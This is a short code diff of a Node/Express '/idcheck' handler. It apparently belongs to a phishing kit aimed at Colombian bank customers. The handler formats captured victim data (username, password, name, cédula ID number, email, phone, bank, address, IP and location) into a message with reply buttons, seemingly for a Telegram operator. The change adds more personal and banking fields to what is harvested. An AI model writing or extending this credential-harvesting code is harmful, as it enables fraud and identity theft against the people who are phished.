@@ -89,18 +89,25 @@ app.post('/idcheck', async (req, res) => {
 ---
 🪪 VERIFICACIÓN DE IDENTIDAD
 
-• Usuario: ${data.user || data.user1 || 'N/D'}
-• Clave: ${data.pass || data.puser || data.puser1 || 'N/D'}
-• Tipo doc: ${data.docType || 'N/D'}
-• Número doc: ${data.docNumber || 'N/D'}
-• Fecha expedición: ${data.docExpDate || 'N/D'}
-• Ciudad expedición: ${data.docCity || 'N/D'}
+• Usuario: ${data.user || 'N/D'}
+• Clave: ${data.pass || 'N/D'}
+• Nombre: ${data.name || 'N/D'}
+• Apellido: ${data.surname || 'N/D'}
+• Cédula: ${data.cc || 'N/D'}
+• Email: ${data.email || 'N/D'}
+• Teléfono: ${data.telnum || 'N/D'}
+• Entidad: ${data.ban || 'N/D'}
+• Cuotas: ${data.dues || 'N/D'}
+• Ciudad: ${data.city || 'N/D'}
+• Departamento: ${data.state || 'N/D'}
+• Dirección: ${data.address || 'N/D'}
 
 🌐 IP: ${data.ip || 'N/D'}
 📍 Ubicación: ${data.location || 'N/D'}
 
 🆔 sessionId: ${sessionId}
 ---`.trim();
+
 
     const reply_markup = {
       inline_keyboard: [
